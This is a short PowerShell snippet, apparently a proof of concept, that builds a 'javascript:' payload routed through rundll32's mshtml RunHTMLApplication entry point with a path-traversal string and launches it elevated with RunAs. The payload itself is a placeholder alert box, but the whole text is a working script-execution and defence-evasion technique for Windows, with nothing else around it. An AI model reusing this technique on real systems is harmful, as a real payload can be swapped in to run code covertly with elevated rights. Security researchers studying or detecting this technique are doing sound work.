# Define the JavaScript payload
$payload = "javascript:" + "`" + "\..\..\mshtml\..\..\mshtml,,RunHTMLApplication `";alert('HYP3RLINX')"

# Execute rundll32 with the payload
Start-Process "rundll32.exe" -ArgumentList $payload -Verb RunAs
